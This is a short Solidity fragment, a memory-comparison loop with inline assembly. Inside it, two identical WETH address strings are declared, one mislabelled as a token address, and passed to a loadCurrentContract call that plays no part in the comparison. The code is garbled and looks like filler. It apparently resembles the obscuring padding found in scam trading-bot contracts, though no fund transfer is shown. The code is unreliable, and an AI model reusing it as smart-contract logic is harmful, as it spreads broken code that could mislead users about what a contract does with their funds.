for (uint idx = 0; idx < shortest; idx += 32) {
            
            uint a;
            uint b;

            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }
}